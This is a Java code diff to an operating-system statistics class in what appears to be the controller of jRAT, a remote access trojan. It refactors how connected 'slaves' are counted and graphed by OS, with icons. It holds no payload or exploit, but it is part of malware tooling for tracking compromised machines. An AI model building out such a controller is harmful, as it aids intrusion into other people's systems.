@@ -12,13 +12,16 @@ import java.util.List;
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Globals;
 import se.jrat.client.ui.frames.Frame;
+import se.jrat.client.utils.IconUtils;
 import se.jrat.common.Logger;
 
 import com.redpois0n.graphs.graph.GraphEntry;
+import com.redpois0n.oslib.Icons;
+import com.redpois0n.oslib.OperatingSystem;
 
 public class OperatingSystemStatistics extends AbstractSettings implements Serializable {
 
-	private static final long serialVersionUID = -7692558803046215384L;
+	private static final long serialVersionUID = 3444250505850670708L;
 
 	private static final OperatingSystemStatistics instance = new OperatingSystemStatistics();
 
@@ -36,19 +39,20 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 		return list;
 	}
 
-	public OperatingSystemStatEntry getEntry(String os) {
+	public OperatingSystemStatEntry getEntry(String str, OperatingSystem os) {
 		for (int i = 0; i < list.size(); i++) {
 			OperatingSystemStatEntry entry = list.get(i);
-			if (entry.getOS().equalsIgnoreCase(os)) {
+			if (entry.getString().equalsIgnoreCase(str)) {
 				return entry;
 			}
 		}
 
 		OperatingSystemStatEntry stat = new OperatingSystemStatEntry();
-		stat.setOS(os);;
+		stat.setString(str);;
+		stat.setOs(os);
 
 		list.add(stat);
-		Logger.log("Added: " + os);
+		Logger.log("Added: " + str);
 		return stat;
 	}
 
@@ -80,7 +84,7 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 			return;
 		}
 
-		OperatingSystemStatEntry entry = getEntry(abstractSlave.getOperatingSystem());
+		OperatingSystemStatEntry entry = getEntry(abstractSlave.getOperatingSystem(), abstractSlave.getOS());
 
 		entry.connects++;
 		boolean exists = false;
@@ -96,20 +100,18 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 	}
 
 	public void reload() {
-		Frame.panelStats.totalGraph.clear();
-		Frame.panelStats.uniqueGraph.clear();
+		Frame.panelStats.osGraph.clear();
 
 		for (int i = 0; i < list.size(); i++) {
 			OperatingSystemStatEntry entry = list.get(i);
 			try {
 
-				GraphEntry total = new GraphEntry(entry.getOS(), entry.getConnects());
-				GraphEntry unique = new GraphEntry(entry.getOS(), entry.getList().size());
+				GraphEntry total = new GraphEntry(entry.getString(), entry.getConnects(), IconUtils.getIcon(Icons.getIconString(entry.getOs(), entry.getString())));
+				//GraphEntry unique = new GraphEntry(entry.getOS(), entry.getList().size());
 
-				Frame.panelStats.totalGraph.add(total);
-				Frame.panelStats.uniqueGraph.add(unique);
+				Frame.panelStats.osGraph.add(total);
+				//Frame.panelStats.osGraph.add(unique);
 				Frame.panelStats.repaint();
-
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
@@ -134,19 +136,20 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 
 	public class OperatingSystemStatEntry implements Serializable {
 
-		private static final long serialVersionUID = 8462429809223243541L;
-
-		private String os = "Unknown";
+		private static final long serialVersionUID = 7061542468278914135L;
+		
+		private OperatingSystem os;
+		private String str = "Unknown";
 		private Integer connects = 0;
 		
 		private List<String> list = new ArrayList<String>();
 
-		public String getOS() {
-			return os;
+		public String getString() {
+			return str;
 		}
 
-		public void setOS(String os) {
-			this.os = os;
+		public void setString(String os) {
+			this.str = os;
 		}
 
 		public List<String> getList() {
@@ -163,6 +166,14 @@ public class OperatingSystemStatistics extends AbstractSettings implements Seria
 		
 		public void setConnects(int connects) {
 			this.connects = connects;
+		}
+
+		public OperatingSystem getOs() {
+			return os;
+		}
+
+		public void setOs(OperatingSystem os) {
+			this.os = os;
 		}
 
 	}
